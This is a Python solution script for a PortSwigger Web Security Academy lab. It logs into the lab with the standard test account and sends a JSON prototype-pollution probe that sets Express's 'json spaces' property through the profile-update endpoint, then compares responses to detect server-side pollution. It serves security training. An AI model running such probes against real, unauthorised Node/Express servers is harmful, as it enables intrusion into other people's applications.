"""
Lab 8: Detecting server-side prototype pollution without polluted property reflection
https://portswigger.net/web-security/prototype-pollution/server-side/lab-detecting-server-side-prototype-pollution-without-polluted-property-reflection
Difficulty: Practitioner

📝 No visible effect from polluting a property directly — need a
side-channel. The standard server-side technique PortSwigger's own
extension automates: pollute a property that affects Express/Node's
response behavior generically (e.g. a property influencing JSON spacing,
a response header, or content-type negotiation) rather than hunting an
app-specific gadget first.
"""

from utils import get_session, log, note, send_json_pollution

TARGET = "https://YOUR-LAB-ID.web-security-academy.net"
UPDATE_PROFILE_PATH = "/my-account/update"
WIENER = {"username": "wiener", "password": "peter"}


def run():
    s = get_session()
    s.post(f"{TARGET}/login", data=WIENER)

    note("Baseline: capture a normal response for comparison.")
    baseline = s.get(f"{TARGET}/")
    baseline_headers = dict(baseline.headers)

    note("Classic side-channel probe: pollute 'json spaces' (an Express-")
    note("specific app setting) — if it takes effect, the JSON formatting")
    note("of ANY later JSON response changes, which is observable without")
    note("needing a specific app gadget.")
    r = send_json_pollution(s, f"{TARGET}{UPDATE_PROFILE_PATH}",
                             target_property="json spaces", value=10,
                             base_object={"name": "wiener", "email": "wiener@normal-user.net"})
    log(f"Pollution request status: {r.status_code}")

    r2 = s.get(f"{TARGET}/")
    log(f"Headers changed: {dict(r2.headers) != baseline_headers}")

    note("If headers/formatting shift after the probe but before any")
    note("app-specific gadget is touched, that's confirmation pollution")
    note("reached the global object prototype — same idea as Lab 6, just")
    note("using a Node/Express-specific property instead of a browser one.")


if __name__ == "__main__":
    run()
